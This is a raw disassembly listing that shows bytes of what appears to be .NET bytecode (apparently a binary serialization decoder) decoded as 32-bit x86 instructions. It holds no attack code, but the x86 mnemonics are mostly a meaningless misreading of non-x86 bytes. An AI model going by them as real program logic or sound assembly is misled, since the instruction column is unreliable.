  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 66             	add    %dh,0x66(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 92             	add    %dh,-0x6e(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
